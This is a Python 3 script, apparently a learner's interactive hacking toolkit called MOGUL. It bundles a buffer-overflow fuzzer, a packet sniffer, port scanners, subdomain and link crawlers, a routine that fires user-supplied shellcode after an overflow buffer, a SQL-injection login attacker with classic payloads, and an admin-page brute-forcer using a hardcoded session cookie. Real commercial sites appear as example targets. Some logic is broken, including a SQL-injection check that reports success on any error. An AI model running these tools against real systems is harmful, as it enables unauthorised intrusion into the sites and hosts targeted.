#All made by 2gis
#All made of Python3

#참고 서적
#>>>『파이썬 해킹 레시피』
#>>>『모의 침투 입문자를 위한 파이썬3 활용』

#======================== Code ========================#	

import socket
import os
import struct
from scapy.all import*
import string
import random
import urllib.request
from time import time
import asyncio
import aiohttp
import requests
import copy
from bs4 import BeautifulSoup, SoupStrainer
from functools import partial
import sys
from urllib.request import build_opener, HTTPCookieProcessor
import http.cookiejar as cookielib
from html.parser import HTMLParser
from urllib.parse import urlencode
import errno
import time
from urllib.parse import urlparse

while True:
	try:
		cmd, op1, op2, op3 = input('root@mogul:~$ ').split()

		def fuzzer():

			print("="*50)
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(op1), int(op2)))
			s.settimeout(0.5)
			msg = ("A"*int(op3))
			s.sendall(msg.encode('utf-8'))
			try:
				s.recv(65565)
			except socket.timeout:
				print("Pass!!!\n"+"="*50)
				s.close()
			else:
				print("Buffer Error Occured!!!\n"+"="*50)

			s.close()

		def snf():
        
			def showPacket(packet):  
				a = packet.show()  
				print(a)
				print("================================")

			def sniffing(filter):  
				sniff(filter = filter, prn = showPacket, count = int(op3))  
  
			if __name__ == '__main__':  
				filter = 'ip'  
				print("================================")
				sniffing(filter)  
				
		def ipconfig():
			a=("Host Name ",socket.gethostname())
			b=("IP Address(Internal) : ",socket.gethostbyname(socket.gethostname()))
			c=("IP Address(External) : ",socket.gethostbyname(socket.getfqdn()))

			print(a)
 
			print(b)
 
			print(c)

		
		def portscan():
			ports = [0,1,5,7,9,11,13,15,17,18,19,20,21,\
			22,23,25,28,37,42,43,47,49,51,52,53,54,56,58,\
			61,67,68,69,70,71,72,73,74,79,80,81,82,83,88,90,\
			95,101,102,104,105,107,108,109,110,113,115,117,118,\
			119,123,126,135,147,138,139,143,152,153,156,158,161,\
			162,170,177,179,194,199,201,209,210,213,218,220,\
			225,226,227,228,229,230,231,232,233,234,235,236,\
			237,238,239,240,241,249,250,251,252,253,254,255,259,\
			262,264,280,300,308,311,319,320,350,351,383,369,\
			384,399,401,427,434,443,444,445,464,465,500,510,\
			514,524,540,548,631,636,655,660,666,981,990,992,\
			993,995,1311,1513,2083,3306,3389,5228,5353,8008,\
			8080,12000]#155개
			st = time.time()
			if op2 == "-a":

				for port in ports:
					try:
						s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
						s.settimeout(0.0001)
						result = s.connect_ex((str(op1), port))

						if result == 0:	
							print("[_] Udp Port " + str(port) + " is opened")

						s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s1.settimeout(0.0001)
						result = s1.connect_ex((str(op1), port))

						if result == 0:
							print("[+] Tcp Port " + str(port) + " is opened")

					except socket.timeout:
						continue
				s.close()
				s1.close()
				et = time.time()
				ft = et-st
				if op3 == "-f":
					print("Finished in :",ft)

			if op2 == "-t":
				for port in ports:
					try:
						s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						s1.settimeout(0.0001)
						result = s1.connect_ex((str(op1), port))

						if result == 0:
							print("[+] Tcp Port " + str(port) + " is opened")

					except socket.timeout:
						continue
				s1.close()
				et = time.time()
				ft = et-st
				if op3 == "-f":
					print("Finished in :",ft)

		def anurl():
			ports = [22, 80, 443, 445, 8080]
			scan_target = input("Input like[cafe24.com] : ")	

			async def async_func():
				futures = [asyncio.ensure_future(port_scan(port)) for port in ports]
				results = await asyncio.gather(*futures)
				for result in results:
					if result["Open"]:
						print(result)


			async def port_scan(port):
				tcp_request = partial(try_connect, port)
				resp = await loop.run_in_executor(None, tcp_request)
				return {"Port": port, "Open": resp[1], "Banner": resp[2]}


			def try_connect(port):
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(2)

				try:
					sock.connect((scan_target, port))
					sock.send("hello".encode())
					data = sock.recv(100).decode("utf-8", "replace")
					sock.close()
					return (port, True, data)

				except Exception as e:
					return (port, False, "")
				finally:
					sock.close()


			if __name__ == "__main__":
				begin = time()
				print(f"Target Address: {scan_target}")
				print(f"Target Ports: {ports}")
				loop = asyncio.get_event_loop()
				loop.run_until_complete(async_func())
				loop.close()
				end = time()
				print(f"finished in : {end - begin}")

		def webscan1():
			wordlist_path = "./subdomains.txt"
			target_domain = input("Input like[cafe24.com] : ")


			async def asnyc_func(domains):
				conn = aiohttp.TCPConnector(limit_per_host=10)
				async with aiohttp.ClientSession(connector=conn) as s:
					futures = [
						asyncio.create_task(discover_url(s, f"http://{domain}.{target_domain}"))
						for domain in domains
					]
					results = await asyncio.gather(*futures)

			async def discover_url(s, domain):
				try:
					async with s.get(domain) as r:
						if r.status == 200:
							output = (domain, r.status)
							print(output)
							return output
						else:
							raise Exception("status_code", r.status)
				except aiohttp.client_exceptions.ClientConnectionError as e:
					# Get Address info failed Error...
					pass
				except Exception as e:
					status_code, error_status = e.args
					output = (domain, error_status)
					print(output)
					return output


			if __name__ == "__main__":
				begin = time()
				subdomain_words = open(wordlist_path).read().splitlines()
				asyncio.run(asnyc_func(subdomain_words))
				end = time()
				print(f"finished in : {end - begin}")

		def webscan2():
			target_domain = input("Input like[https://cafe24.com] : ")
			results = set()


			def check_target_domain(domain):
				if domain[-1] == "/":
					return domain[:-1]
				else:
					return domain


			def discover_directory(domain):
				hrefs = set()
				try:
					content = requests.get(domain).content
				except requests.exceptions.ConnectionError:
					pass
				except Exception as e:
					print(f"Requets error: {e}")
				for link in BeautifulSoup(
					content, features="html.parser", parse_only=SoupStrainer("a")
				):
					if hasattr(link, "href"):
						try:
							path = link["href"]
							if (
								path.startswith("#")
								or path.startswith("javascript")
								or path.endswith(".jpg")
								or path.endswith(".png")
								or path.endswith(".css")
								or path.endswith(".js")
							):
								continue
							elif path.startswith("/") or path.startswith("?"):
								hrefs.add(f"{target_domain}{path}")
							elif target_domain not in path and path[:4] != "http":
								hrefs.add(f"{target_domain}/{path}")
							else:
								hrefs.add(path)
						except KeyError:
							pass
						except Exception as e:
							print(f"Error when parsing: {e}")
				
				for href in hrefs:
					if href.startswith(target_domain):
						results.add(href)


			if __name__ == "__main__":
				target_domain = check_target_domain(target_domain)
				discover_directory(target_domain)
				links = copy.deepcopy(results)
				print(f"Start Scanning on {len(links)} Links...")
				for link in links:
					print(f"Searching on ... {link}")
					links.add(link)
					discover_directory(link)
				print(f"{results}")
				print(f"Found {len(results)} Links !!!")	

		def shell():
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(op1), int(op2)))
			length = input("Enter length like[65535] : ")
			buff = "A"*int(length)
			shell = input("Input shellcode : ")

			s.sendall((buff+shell).encode())
			print("Shellcode is sent !")#효과는 미미했다!
			data = s.recv(65535)
			print(data)

		def sqli():
			try:
				sqlcodes = ['\'', '--', '/*', '"', '\' OR \'1\' = \'1\'; -- ']

				targeturl = input('Url like[https://www.29cm.co.kr/] : ')
				targetpost = input('Post like[https://www.29cm.co.kr/member/login] : ')
				print("="*50)
				username_field = 'admin'
				pass_field = 'pwd'
				check = 'update'

				class myHTMLParser(HTMLParser):
					def __init__(self):
						HTMLParser.__init__(self)
						self.tagResult = {}
			
					def handle_starttag(self, tag, attrs):
						if tag == 'input':
							tagname = None
							tagvalue = None
							for name, value in attrs:
								if name == 'name':
									tagname = value
								if name == 'value':
									tagvalue = value
						
							if tagname is not None:
								self.tagResult[tagname] = tagvalue		


				def webAuthCracker(username):
					password = ''
					cookies = cookielib.FileCookieJar('cookies')
					opener = build_opener(HTTPCookieProcessor(cookies))
					res = opener.open(targeturl)
					htmlpage = res.read().decode()
		
					print('+++TRYING %s: %s' %(username, password))
		
					parseR = myHTMLParser()
					parseR.feed(htmlpage)		
		
					inputtags = parseR.tagResult
					inputtags[username_field] = username
					inputtags[pass_field] = password
		
					loginData = urlencode(inputtags).encode('utf-8')
					loginRes = opener.open(targetpost, data=loginData)
					loginResult = loginRes.read().decode()
		
					if check in loginResult:#혹시몰라 만듬.이걸 오류로 생각하고 만들었는데;;
						print('---CRACKING SUCCESS!')
						print('---SQL INJECTION [%s]' %username)			
			

				def main():
					print('+++SQL INJECTION START..')
					for sqlcode in sqlcodes:
						print('>>>INJECT SQL [%s]' %sqlcode) 
						webAuthCracker(sqlcode)	
		
				if __name__ == '__main__':
					main()

			except Exception as ex:#이게 ㄹㅇ오류인듯
				print('---CRACKING SUCCESS!')
				pass
				
			print("="*50)

		def mogul():
			name = (socket.gethostname())
			print("="*50)
			print("Easter Egg Cracked ! ! !")
			print("'"+name+"'"+",I will remember.")
			print("Thanks for using MOGUL ! ! !")
			print("(/≧▽≦)/")
			print("="*50)

		def admin():
			st = time.time()
			session_id = 'JSESSIONID'
			session_value = '8F9393F17A57071985653EE47CA'
			cookies = {session_id : session_value}

			f = open("./admin_page_find.txt",'r')
			number = 0
			k = 0
			attack = []
			find_admin = []
			lines = f.readlines()
			for i in lines:
				try:
					attack.append(i[:-1])
					url_input = op1
					url = str(op1)+str(attack[k])
					time.sleep(0.000001)
					res = requests.get(url, cookies = cookies)
					if res.status_code == 200:
						find_admin.append(url)
						print(url)
						print('+++++ find admin +++++')
					if res.status_code != 404:
						print("failed : "+str(attack[k]))
					k = k+1
				except socket.timeout:
					print("timed out")
					pass

			et = time.time()
			ft = et-st
			if find_admin == None:
				print("no admin")
			else:
				print(find_admin)
			print(ft)

		def ipaddr():
			url = str(op1)
			o = urlparse(url)
			hostname = o.hostname
			port = o.port or (443 if o.scheme == "https" else 80)
			ipaddr = socket.getaddrinfo(hostname,port)[0][4][0]
			print(ipaddr)

		if cmd == "fuzz":
			fuzzer()
		if cmd == "snf":
			snf()
		if cmd == "ipcg":
			ipconfig()
		if cmd == "pscn":
			portscan()
		if cmd == "anurl":
			anurl()
		if cmd == "webscn1":
			webscan1()
		if cmd == "webscn2":
			webscan2()
		if cmd == "shell":
			shell()
		if cmd == "sqli":
			sqli()
		if cmd == "mogul" or "MOGUL":
			if op1 == "is":
				if op2 == "very":
					if op3 == "nice":
						mogul()
		if cmd == "fmod":
			admin()
		if cmd == "ipaddr":
			ipaddr()

	except ValueError:
		print("="*50)
		print("ValueError : <cmd> <op1> <op2> <op3>\nif option == None:\n	option = <'any' like '0' or '~'>")
		print("="*50)
		pass

#======================================================#